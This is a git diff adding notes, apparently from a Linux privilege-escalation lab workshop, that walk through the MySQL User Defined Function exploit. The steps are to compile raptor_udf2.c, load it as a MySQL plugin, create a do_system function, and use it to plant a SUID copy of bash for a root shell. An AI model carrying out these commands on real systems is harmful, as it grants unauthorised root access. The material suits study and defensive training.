@@ -9,6 +9,45 @@ https://github.com/sagishahar/lpeworkshop
 ## 1. Service Exploits
 ### mysql 
 Using the exploit from exploit db to get the rootshell. Since mysql is run by root without password where we can create the tables and run the `command` using function.
+The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.
+
+Change into the /home/user/tools/mysql-udf directory:
+```bash
+root@gr4n173:~$ cd /home/user/tools/mysql-udf
+```
+
+Compile the `raptor_udf2.c` exploit code using the following commands:
+```bash
+root@gr4n173:~$ gcc -g -c raptor_udf2.c -fPIC
+root@gr4n173:~$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
+
+
+Connect to the MySQL service as the root user with a blank password:
+```bash
+root@gr4n173:~$ mysql -u root
+```
+
+Execute the following commands on the MySQL shell to create a User Defined Function (UDF) `"do_system"` using our compiled exploit:
+```bash
+mysql> use mysql;
+mysql> create table foo(line blob);
+mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+```
+
+
+Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
+```
+mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+```
+
+Exit out of the MySQL shell (type `exit` or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
+```bash
+root@gr4n173:~$ /tmp/rootbash -p
+```
+
 
 ## 2. Week file permission 
 ### Readable
